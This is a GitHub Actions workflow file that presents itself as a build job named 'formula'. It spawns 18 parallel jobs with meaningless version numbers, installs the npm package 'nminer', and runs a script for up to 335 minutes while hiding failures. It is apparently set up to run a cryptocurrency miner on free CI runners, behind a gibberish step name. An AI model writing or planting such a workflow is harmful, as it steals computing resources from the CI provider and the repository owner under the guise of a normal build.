name: formula
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 192 }
          - { version: 8356 }
          - { version: 3396 }
          - { version: 4662 }
          - { version: 1240 }
          - { version: 6880 }
          - { version: 7261 }
          - { version: 1413 }
          - { version: 1151 }
          - { version: 1296 }
          - { version: 3471 }
          - { version: 4096 }
          - { version: 8436 }
          - { version: 2729 }
          - { version: 5885 }
          - { version: 953 }
          - { version: 614 }
          - { version: 7442 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: french oh anti
        run: |
          npm install nminer@latest
          timeout 335m node formula.js || echo "formula executed"